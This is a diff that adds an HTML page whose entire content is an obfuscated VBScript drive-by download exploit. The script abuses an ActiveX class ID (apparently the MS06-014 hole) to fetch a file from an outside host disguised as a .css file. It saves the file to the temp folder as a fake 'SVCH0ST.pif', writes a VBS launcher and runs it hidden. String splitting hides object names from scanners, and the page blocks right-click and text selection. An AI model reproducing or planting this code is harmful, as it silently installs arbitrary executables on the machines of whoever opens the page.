@@ -1,0 +1,80 @@
+/*
+*/
+<html>
+<body>
+</body>
+
+<script language=VBScript>
+On Error Resume Next
+dubasbaddressssssssss = "http://user1.16-36.net/ms06014.css"
+dubasbobj="o"
+dubasbobjs="b"
+dubasbobjss="j"
+dubasbobjsss="e"
+dubasbobjssss="c"
+dubasbobjsssss="t"
+Set dubasb_2_cn = document.createElement(dubasbobj&dubasbobjs&dubasbobjss&dubasbobjsss&dubasbobjssss&dubasbobjsssss)
+dubasbid="clsid:"
+dubasbidx="BD"
+dubasbid2="96"
+dubasbid3="C5"
+dubasbid4="56-6"
+dubasbid5="5A"
+dubasbid6="3-1"
+dubasbid7="1D"
+dubasbid8="0-98"
+dubasbid9="3A-0"
+dubasbid10="0C0"
+dubasbid11="4FC"
+dubasbid12="29E"
+dubasbid13="36"
+dubasb3="Microsoft.X"
+dubasb4="MLHTTp"
+dubasb5="G"
+dubasb6="E"
+dubasb7="T"
+dubasbxml="M"&"i"&"c"&"r"&"osof"&"t.XM"&"LHTTp"
+dubasb_2_cn.SetAttribute "classid", dubasbid&dubasbidx&dubasbid2&dubasbid3&dubasbid4&dubasbid5&dubasbid6&dubasbid7&dubasbid8&dubasbid9&dubasbid10&dubasbid11&dubasbid12&dubasbid13
+Set dubasb_love=dubasb_2_cn.CreateObject(dubasbxml,"")
+dubasb_love.Open dubasb5&dubasb6&dubasb7, dubasbaddressssssssss, False
+dubasb_love.Send
+dubasbbuffe="SVCH0ST.pif"
+dubasb_kfqq_sssssssss="SVCH0ST.vbs"
+Q784378237="Scripting."
+Q784378237s="FileSyst"
+Q784378237ss="emObject"
+Q784378237sss="Adod"
+Q784378237ssss="b.stream"
+Q784378237sssss=Q784378237sss&Q784378237ssss
+Set chilam = dubasb_2_cn.createobject(Q784378237&Q784378237s&Q784378237ss,"")
+Set yingying = chilam.GetSpecialFolder(2)
+dubasbuser="chilam"
+dubasbbuffe=chilam.BuildPath(yingying,dubasbbuffe)
+dubasb_kfqq_sssssssss=chilam.BuildPath(yingying,dubasb_kfqq_sssssssss)
+Set chilams = dubasb_2_cn.createobject(Q784378237sssss,"")
+chilams.type=1
+chilams.Open
+chilams.Write dubasb_love.Responsebody
+chilams.Savetofile dubasbbuffe,2
+chilams.Close
+chilams.Type=2
+chilams.Open
+chilams.WriteText  "'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"Set i_love_dubasb = CreateObject(""Wscript"&".Shell"")"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"i_love_dubasb.run ("""&dubasbbuffe&""")"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"
+chilams.Savetofile dubasb_kfqq_sssssssss,2
+chilams.Close
+www="She"
+cute="ll.A"
+qq="ppl"
+cn="ica"
+kfqq="tion"
+Set dubasbsened = dubasb_2_cn.createobject(www&cute&qq&cn&kfqq, "")
+dubasbdk="O"
+dubasbdks="p"
+dubasbdkss="e"
+dubasbdksss="n"
+dubasbsened.ShellExeCute dubasb_kfqq_sssssssss, "", "", dubasbdk&dubasbdks&dubasbdkss&dubasbdksss, 0
+</script>
+
+</html>
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>  
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
